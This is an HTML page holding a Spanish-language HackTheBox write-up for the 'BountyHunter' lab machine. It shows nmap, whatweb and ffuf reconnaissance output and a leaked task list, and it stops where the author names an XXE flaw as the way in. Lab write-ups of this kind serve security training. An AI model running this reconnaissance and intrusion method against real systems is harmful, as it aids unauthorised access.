
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      <link rel="icon" href="../../assets/favicon.svg">
      <meta name="generator" content="mkdocs-1.2.2, mkdocs-material-7.2.0">
    
    
      
        <title>BountyHunter - HackTheBox</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.fe914879.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ba0d045b.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
      
    
    
    
    
      


    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="light-blue">
  
    
    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
      <script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#description" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="HackTheBox" class="md-header__button md-logo" aria-label="HackTheBox" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            HackTheBox
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              BountyHunter
            
          </span>
        </div>
      </div>
    </div>
    
      <form class="md-header__option" data-md-component="palette">
        
          
          
          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="light-blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
          
            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7 10a2 2 0 0 1 2 2 2 2 0 0 1-2 2 2 2 0 0 1-2-2 2 2 0 0 1 2-2m10-3a5 5 0 0 1 5 5 5 5 0 0 1-5 5H7a5 5 0 0 1-5-5 5 5 0 0 1 5-5h10M7 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3h10a3 3 0 0 0 3-3 3 3 0 0 0-3-3H7z"/></svg>
            </label>
          
        
          
          
          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
          
            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg>
            </label>
          
        
      </form>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        
<a href="https://github.com/LoRKaa/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    https://github.com/LoRKaa
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../.." class="md-tabs__link">
      Home
    </a>
  </li>

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../explore/" class="md-tabs__link md-tabs__link--active">
        Machines
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../tools/htbenum/" class="md-tabs__link">
        Tools
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="HackTheBox" class="md-nav__button md-logo" aria-label="HackTheBox" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg>

    </a>
    HackTheBox
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/LoRKaa/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    https://github.com/LoRKaa
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
      
      <label class="md-nav__link" for="__nav_2">
        Machines
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Machines" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Machines
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../explore/" class="md-nav__link">
        Explore
      </a>
    </li>
  

          
            
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          BountyHunter
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        BountyHunter
      </a>
      
        
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
     Description
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
     Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-own" class="md-nav__link">
     User Own
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#root-own" class="md-nav__link">
     Root Own
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      <label class="md-nav__link" for="__nav_3">
        Tools
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Tools" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Tools
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/htbenum/" class="md-nav__link">
        HTBenum
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../tools/ffuf/" class="md-nav__link">
        FFUF
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
     Description
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
     Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-own" class="md-nav__link">
     User Own
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#root-own" class="md-nav__link">
     Root Own
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/LoRKaa/edit/master/docs/machines/bountyhunter.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                  <h1>BountyHunter</h1>
                
                <style>
  .md-typeset h1,
  .md-content__button {
    display: none;
  }
</style>

<p><img alt="" src="../../assets/bountyhunter/profile.png" /></p>
<p>Difficulty : <code>Easy</code><br />
Operating System : <code>Linux</code>  <br />
Rating : <code>4.4</code><br />
Author : <a href="https://app.hackthebox.eu/users/280547"><code>ejedev</code></a></p>
<h3 id="description"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Description</h3>
<p>Para comprometer esta maquina haremos uso de una vulnerabilidad <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">xxe</a> que nos permitira abrir el camino para
encontrar las credenciales del usuario inicial. Una vez dentro de la maquina deberemos explotar un script en python
para conseguir acceso a root.
Aunque el enunciado indica que es una maquina de nivel facil, yo la calificaria de intermedia, pues necesitamos
pensar un poco "out of the box" para realizar la intrusion.</p>
<h3 id="enumeration"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Enumeration</h3>
<p>Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox.
Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica.  </p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.97 11.03a.75.75 0 1 1 1.06-1.06L11 14.94V2.75a.75.75 0 0 1 1.5 0v12.19l4.97-4.97a.75.75 0 1 1 1.06 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0l-6.25-6.25zm-.22 9.47a.75.75 0 0 0 0 1.5h14.5a.75.75 0 0 0 0-1.5H4.75z"/></svg></span> Descarga: <a href="../../tools/htbenum"><strong>HTBenum</strong></a></p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M14.53 15.59a8.25 8.25 0 1 1 1.06-1.06l5.69 5.69a.75.75 0 1 1-1.06 1.06l-5.69-5.69zM2.5 9.25a6.75 6.75 0 1 1 11.74 4.547.746.746 0 0 0-.443.442A6.75 6.75 0 0 1 2.5 9.25z"/></svg></span> Nmap
<div class="highlight"><pre><span></span><code>Nmap scan report for bountyhunter.htb (10.129.192.240)
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>
<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M14.53 15.59a8.25 8.25 0 1 1 1.06-1.06l5.69 5.69a.75.75 0 1 1-1.06 1.06l-5.69-5.69zM2.5 9.25a6.75 6.75 0 1 1 11.74 4.547.746.746 0 0 0-.443.442A6.75 6.75 0 0 1 2.5 9.25z"/></svg></span> Whatweb
<div class="highlight"><pre><span></span><code>http://bountyhunter.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.192.240], JQuery, Script, Title[Bounty Hunters]
</code></pre></div>
<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M14.53 15.59a8.25 8.25 0 1 1 1.06-1.06l5.69 5.69a.75.75 0 1 1-1.06 1.06l-5.69-5.69zM2.5 9.25a6.75 6.75 0 1 1 11.74 4.547.746.746 0 0 0-.443.442A6.75 6.75 0 0 1 2.5 9.25z"/></svg></span> HTTP Headers
<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
Date: Mon, 26 Jul 2021 14:50:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
</code></pre></div>
<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M14.53 15.59a8.25 8.25 0 1 1 1.06-1.06l5.69 5.69a.75.75 0 1 1-1.06 1.06l-5.69-5.69zM2.5 9.25a6.75 6.75 0 1 1 11.74 4.547.746.746 0 0 0-.443.442A6.75 6.75 0 0 1 2.5 9.25z"/></svg></span> Fuzzing URL
<div class="highlight"><pre><span></span><code>[root@htb bountyhunter]# ffuf -recursion -c -e &#39;.htm&#39;,&#39;.php&#39;,&#39;.html&#39;,&#39;.js&#39;,&#39;.txt&#39;,&#39;.zip&#39;,&#39;.bak&#39;,&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.xml&#39;,&#39;.py&#39;,&#39;.log&#39;,&#39;.json&#39;,&#39;.old&#39; -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bountyhunter.htb/FUZZ

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bountyhunter.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .htm .php .html .js .txt .zip .bak .asp .aspx .xml .py .log .json .old
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________


index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
resources               [Status: 301, Size: 324, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://bountyhunter.htb/resources/FUZZ

assets                  [Status: 301, Size: 321, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://bountyhunter.htb/assets/FUZZ

portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://bountyhunter.htb/css/FUZZ

db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://bountyhunter.htb/js/FUZZ
</code></pre></div></p>
<h3 id="user-own"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> User Own</h3>
<p>Tras analizar los directorios y ficheros obtenidos con <code>ffuf</code> , me encuentro con dos archivos interesantes dentro de la
carpeta <em>resources</em>  </p>
<p><img alt="" src="../../assets/bountyhunter/resources.png" /></p>
<p>En este archivo podemos ver una lista de tareas <em>pendientes</em> , aparentemente los passwords no se hashean.  </p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M5 2.5a.5.5 0 0 0-.5.5v18a.5.5 0 0 0 .5.5h14a.5.5 0 0 0 .5-.5V8.5h-4a2 2 0 0 1-2-2v-4H5zm10 0v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0-.146-.336l-4.018-4.018A.5.5 0 0 0 15 2.5zM3 3a2 2 0 0 1 2-2h9.982a2 2 0 0 1 1.414.586l4.018 4.018A2 2 0 0 1 21 7.018V21a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V3z"/></svg></span> <strong><code>README.txt</code></strong><br />
<div class="highlight"><pre><span></span><code>Tasks:

[ ] Disable &#39;test&#39; account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
</code></pre></div>
El siguiente archivo nos muestra lo que parece ser un formulario enviado como POST a <code>tracker_diRbPr00f314.php</code> que es procesado como un xml, lo que nos 
indica que podriamos estar ante una vulnerabilidad <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity</a>  </p>
